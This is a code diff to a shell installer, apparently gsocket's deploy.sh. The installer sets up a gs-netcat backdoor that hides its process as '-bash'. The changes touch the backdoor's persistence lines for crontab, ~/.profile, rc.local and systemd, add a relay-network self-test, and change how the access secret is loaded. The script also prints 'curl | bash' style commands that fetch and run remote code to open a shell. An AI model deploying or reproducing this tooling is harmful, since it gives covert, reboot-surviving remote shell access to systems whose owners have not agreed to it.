@@ -28,6 +28,8 @@
 #         GS_DEBUG=1 GS_USELOCAL=1 GS_NOSTART=1 GS_NOINST=1 ./deploy.sh
 # GS_USELOCAL=1
 #       - Use local binaries (do not download)
+# GS_USELOCAL_GSNC=<path to gs-netcat binary>
+#       - Use local gs-netcat from source tree
 # GS_NOSTART=1
 #       - Do not start gs-netcat (for testing purpose only)
 # GS_NOINST=1
@@ -223,22 +225,30 @@ init_vars()
 	SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
 
 	# OSX's pkill matches the hidden name and not the original binary name.
-	# Because we hide as '-bash' we can not pkill all -bash.
+	# Because we hide as '-bash' we can not use pkill all -bash.
 	# 'killall' however matches gs-bd and on OSX we thus force killall
 	if [[ $OSTYPE == *darwin* ]]; then
 		KL_CMD="killall"
-		KL_CMD_UARG="-u${USER}"
+		KL_CMD_RUNCHK_UARG="-0 -u${USER}"
 	elif command -v pkill >/dev/null; then
 		KL_CMD="pkill"
-		KL_CMD_UARG="-U${UID}"
+		KL_CMD_RUNCHK_UARG="-0 -U${UID}"
 	elif command -v killall >/dev/null; then
 		KL_CMD="killall"
 		# cygwin's killall needs the name (not the uid)
-		KL_CMD_UARG="-u${USER}"
+		KL_CMD_RUNCHK_UARG="-0 -u${USER}"
 	fi
 
-	command -v "$KL_CMD" >/dev/null || WARN "No pkill or killall found."
-	# command -v "$KL_CMD" >/dev/null || errexit "Need pkill or killall."
+	# $PATH might be set differently in crontab/.profile. Use
+	# absolute path to binary instead:
+	KL_CMD_BIN="$(command -v "$KL_CMD")"
+	[[ -z $KL_CMD_BIN ]] && {
+		# set to something that returns 'false' so that we dont
+		# have to check for empty string in crontab/.profile
+		KL_CMD_BIN="$(command -v false)"
+		[[ -z $KL_CMD_BIN ]] && KL_CMD_BIN="/bin/does-not-exit"
+		WARN "No pkill or killall found."
+	}
 
 	# Defaults
 	BIN_HIDDEN_NAME="${BIN_HIDDEN_NAME_DEFAULT}"
@@ -262,8 +272,6 @@ init_vars()
 	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
 
 	DEBUGF "SRC_PKG=$SRC_PKG"
-
-	# [[ -n $GS_DEBUG ]] && GS_USELOCAL=1
 }
 
 init_setup()
@@ -298,8 +306,15 @@ init_setup()
 	USER_SEC_FILE="$(dirname "${DSTBIN}")/${SEC_NAME}"
 	RCLOCAL_LINE="HOME=$HOME TERM=xterm-256color SHELL=$SHELL GSOCKET_ARGS=\"-k ${RCLOCAL_SEC_FILE} -liqD\" $(command -v bash) -c \"cd /root; exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
 
-	PROFILE_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})"
-	CRONTAB_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
+	# There is no reliable way to check if a process is running:
+	# - Process might be running under different name. Especially OSX checks for the orginal name
+	#   but not the hidden name.
+	# - pkill or killall may no longer be in the PATH (especially when executed from crontab)
+	# The best we can do:
+	# 1. If pidof/killall/pkill exist _AND_ daemon is running then do nothing.
+	# 2. Otherwise start gs-bd as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
+	PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})"
+	CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
 
 	# check that xxd is working as expected (alpine linux does not have -r option)
 	if [[ "$(echo "thcwashere" | xxd -ps -c1024 2>/dev/null| xxd -r -ps 2>/dev/null)" = "thcwashere" ]]; then
@@ -391,7 +406,7 @@ uninstall()
 	uninstall_rm "${SERVICE_DIR}/${SEC_NAME}"
 
 	echo -e 1>&2 "${CG}Uninstall complete.${CN}"
-	echo -e 1>&2 "--> Use ${CM}${KL_CMD} ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
+	echo -e 1>&2 "--> Use ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${CN} to terminate all running shells."
 	exit 0
 }
 
@@ -410,7 +425,9 @@ OK_OUT()
 FAIL_OUT()
 {
 	echo -e 1>&2 "..[${CR}FAILED${CN}]"
-	[[ -n "$1" ]] && echo -e 1>&2 "--> $*"
+	for str in "$@"; do
+		echo -e 1>&2 "--> $str"
+	done
 }
 
 WARN()
@@ -431,9 +448,20 @@ WARN_EXECFAIL()
 	echo -e 1>&2 "--> ${WARN_EXECFAIL_MSG}"
 }
 
+HOWTO_CONNECT_OUT()
+{
+	# After all install attempts output help how to uninstall
+	echo -e 1>&2 "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
+	echo -e 1>&2 "--> To connect use one of the following:
+--> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
+--> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
+--> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+}
+
+# Try to load a GS_SECRET
 gs_secret_reload()
 {
-	[[ ! -f "$1" ]] && WARN "Oops. $1 not found. Uninstall needed?"
+	[[ ! -f "$1" ]] && return
 	# GS_SECRET="UNKNOWN" # never ever set GS_SECRET to a known value
 	local sec
 	sec=$(<"$1")
@@ -457,7 +485,6 @@ install_system_systemd()
 			IS_GS_RUNNING=1
 		fi
 		IS_SYSTEMD=1
-		gs_secret_reload "$SYSTEMD_SEC_FILE" 
 		SKIP_OUT "${SERVICE_FILE} already exists."
 		return
 	fi
@@ -514,7 +541,6 @@ install_system_rclocal()
 	if grep "$BIN_HIDDEN_NAME" "${RCLOCAL_FILE}" &>/dev/null; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
-		gs_secret_reload "$RCLOCAL_SEC_FILE" 
 		SKIP_OUT "Already installed in ${RCLOCAL_FILE}."
 		return	
 	fi
@@ -548,11 +574,9 @@ install_user_crontab()
 {
 	command -v crontab >/dev/null || return # no crontab
 	echo -en 2>&1 "Installing access via crontab........................................."
-	[[ -z "$KL_CMD" ]] && { FAIL_OUT "No pkill or killall found."; return; }
 	if crontab -l 2>/dev/null | grep "$BIN_HIDDEN_NAME" &>/dev/null; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
-		gs_secret_reload "$USER_SEC_FILE"
 		SKIP_OUT "Already installed in crontab."
 		return
 	fi
@@ -571,12 +595,10 @@ install_user_crontab()
 install_user_profile()
 {
 	echo -en 2>&1 "Installing access via ~/${RC_FILENAME_STATUS}......................................"
-	[[ -z "$KL_CMD" ]] && { FAIL_OUT "No pkill or killall found."; return; }
 	[[ -f "${RC_FILE}" ]] || { touch "${RC_FILE}"; chmod 600 "${RC_FILE}"; }
 	if grep "$BIN_HIDDEN_NAME" "$RC_FILE" &>/dev/null; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
-		gs_secret_reload "$USER_SEC_FILE"
 		SKIP_OUT "Already installed in ${RC_FILE}"
 		return
 	fi
@@ -741,26 +763,79 @@ test_bin()
 
 	bin="$1"
 
-	GS_SECRET=$("$bin" -g 2>/dev/null)
+	# Try to execute the binary
+	GS_OUT=$("$bin" -g 2>/dev/null)
 	ret=$?
-	[[ -z "$GS_SECRET" ]] && { FAIL_OUT; ERR_LOG="wrong binary"; WARN_EXECFAIL_SET "$ret" "wrong binary"; return; }
+	# 126 - Exec format error
+	[[ -z "$GS_OUT" ]] && { FAIL_OUT; ERR_LOG="wrong binary"; WARN_EXECFAIL_SET "$ret" "wrong binary"; return; }
 
-	err_log=$(GSOCKET_ARGS="-s selftest-${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${bin}" 2>&1)
+	# Use randomly generated secret unless it's set already (X=)
+	[[ -z $GS_SECRET ]] && GS_SECRET="$GS_OUT"
+
+	IS_TESTBIN_OK=1
+}
+
+test_network()
+{
+	unset IS_TESTNETWORK_OK
+
+	# There should be no GS-NETCAT listening.
+	# _GSOCKET_SERVER_CHECK_SEC=n makes gs-netcat try the connection.
+	# 1. Exit=0 immediatly if server exists.
+	# 2. Exit=202 after n seconds. Firewalled/DNS?
+	# 3. Exit=203 if TCP to GSRN is refused.
+	# 3. Exit=61 on GS-Connection refused. (server does not exist)
+	err_log=$(_GSOCKET_SERVER_CHECK_SEC=10 GSOCKET_ARGS="-s ${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${DSTBIN}" 2>&1)
 	ret=$?
 
 	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
-	[[ $ret -eq 139 ]] && { FAIL_OUT; ERR_LOG=""; WARN_EXECFAIL_SET "$ret" "SIGSEGV"; return; }
-	# 126 - Exec format error
-	# 255 && "connect(" match => Cannot connect to backend
-	[[ $ret -eq 255 ]] && [[ $err_log =~ connect\( ]] && { FAIL_OUT; errexit "Cannot connect to GSRN. Firewalled?"; }
+	[[ $ret -eq 139 ]] && { 
+		ERR_LOG=""
+		WARN_EXECFAIL_SET "$ret" "SIGSEGV"
+		return
+	}
 
-	# Fail unless it's ECONNREFUSED
-	[[ $ret -ne 61 ]] && { FAIL_OUT; WARN_EXECFAIL_SET "$ret" "default pkg failed"; return; }
+	{ [[ $ret -eq 202 ]] || [[ $ret -eq 203 ]]; } && {
+		# 202 - Timeout (alarm)
+		# 203 - TCP connection refused
+		FAIL_OUT
+		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+		# EXIT if we can not check if SECRET has already been used.
+		errexit "Cannot connect to GSRN. Firewalled?"
+	}
 
-	# exit code of gs-netcat was ECONNREFUSED. Thus connection to server
-	# was successfully and server replied that no client is listening. 
-	# This is a good enough test that this binary is working.
-	IS_TESTBIN_OK=1
+	[[ $ret -eq 0 ]] && {
+		FAIL_OUT "Secret '${GS_SECRET}' is already used."
+		HOWTO_CONNECT_OUT
+		exit_code 0
+	}
+
+	# Fail _unless_ it's ECONNREFUSED
+	[[ $ret -eq 61 ]] && {
+		# HERE: ECONNREFUSED
+		# Connection to GSRN was successfull and GSRN reports
+		# that no server is listening.
+		# This is a good enough test that this network & binary is working.
+		IS_TESTNETWORK_OK=1
+		return
+	}
+
+	# Unknown error condition
+	WARN_EXECFAIL_SET "$ret" "default pkg failed"
+}
+
+try_network()
+{
+	echo -en 2>&1 "Testing Global Socket Relay Network..................................."
+	test_network
+	if [[ -n "$IS_TESTNETWORK_OK" ]]; then
+		OK_OUT
+		return
+	fi
+
+	FAIL_OUT
+	[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+	WARN_EXECFAIL
 }
 
 # try <osarch>
@@ -781,6 +856,10 @@ try()
 	# Unpack (suppress "tar: warning: skipping header 'x'" on alpine linux
 	(cd "${TMPDIR}" && tar xfz "${src_pkg}" 2>/dev/null) || { FAIL_OUT "unpacking failed"; errexit; }
 	[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
+	[[ -n $GS_USELOCAL_GSNC ]] && {
+		[[ -f "$GS_USELOCAL_GSNC" ]] || { FAIL_OUT "Not found: ${GS_USELOCAL_GSNC}"; errexit; }
+		cp "${GS_USELOCAL_GSNC}" "${TMPDIR}/gs-netcat"
+	}
 	OK_OUT
 
 	echo -en 2>&1 "Copying binaries......................................................"
@@ -846,7 +925,7 @@ gs_start()
 	# ./deploy.sh -> re-installs new secret. Start gs-bd with _new_ secret.
 	# Now two gs-bd's are running (which is correct)
 	if [[ -n "$KL_CMD" ]]; then
-		${KL_CMD} -0 "$KL_CMD_UARG" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
+		${KL_CMD} $KL_CMD_RUNCHK_UARG "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
 	elif command -v pidof >/dev/null; then
 		# if no pkill/killall then try pidof (but we cant tell which user...)
 		if pidof -qs "$BIN_HIDDEN_NAME" &>/dev/null; then
@@ -865,7 +944,7 @@ gs_start()
 			OK_OUT
 			WARN "More than one ${BIN_HIDDEN_NAME} is running. You"
 			echo -e 1>&2 "             may want to check: ${CM}ps -elf|grep -- ${PROC_HIDDEN_NAME}${CN}"
-			echo -e 1>&2 "             or terminate all : ${CM}${KL_CMD} ${BIN_HIDDEN_NAME}${CN}"
+			echo -e 1>&2 "             or terminate all : ${CM}${KL_CMD:-pkill} ${BIN_HIDDEN_NAME}${CN}"
 		fi
 	else
 		OK_OUT ""
@@ -884,18 +963,27 @@ init_vars
 
 init_setup
 
+
+# User supplied install-secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
+[[ -z $GS_SECRET ]] && [[ -n "$X" ]] && GS_SECRET="$X"
+
+if [[ $UID -eq 0 ]]; then
+	[[ -z $GS_SECRET ]] && gs_secret_reload "$SYSTEMD_SEC_FILE" 
+	[[ -z $GS_SECRET ]] && gs_secret_reload "$RCLOCAL_SEC_FILE" 
+fi
+[[ -z $GS_SECRET ]] && gs_secret_reload "$USER_SEC_FILE"
+
 try "$OSARCH"
 [[ -z "$GS_OSARCH" ]] && [[ -z "$IS_TESTBIN_OK" ]] && try_any
 WARN_EXECFAIL
 [[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
 
+[[ -z $S ]] && try_network
+
 [[ -n "$GS_UPDATE" ]] && gs_update
 
 # S= is set. Do not install but connect to remote using S= as secret.
 [[ -n "$S" ]] && gs_access
-
-# User supplied secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
-[[ -n "$X" ]] && GS_SECRET="$X"
 
 # -----BEGIN Install permanentally-----
 # Try to install system wide. This may also start the service.
@@ -910,21 +998,15 @@ WARN_EXECFAIL
 if [[ -z "$IS_INSTALLED" ]]; then
 	echo -e 1>&1 "--> ${CR}Access will be lost after reboot.${CN}"
 fi
-# After all install attempts output help how to uninstall
-echo -e 1>&2 "--> To uninstall use ${CM}GS_UNDO=1 ${DL_CMD}${CN}"
+
 
 printf 1>&2 "%-70.70s" "Starting '${BIN_HIDDEN_NAME}' as hidden process '${PROC_HIDDEN_NAME}'....................................."
 if [[ -n "$GS_NOSTART" ]]; then
-	SKIP_OUT "GS_NOSTART is set."
+	SKIP_OUT "GS_NOSTART=1 is set."
 else
 	gs_start
 fi
 
-
-echo -e 1>&2 "--> To connect use one of the following:
---> ${CM}gs-netcat -s \"${GS_SECRET}\" -i${CN}
---> ${CM}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
---> ${CM}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
-
+HOWTO_CONNECT_OUT
 
 exit_code 0
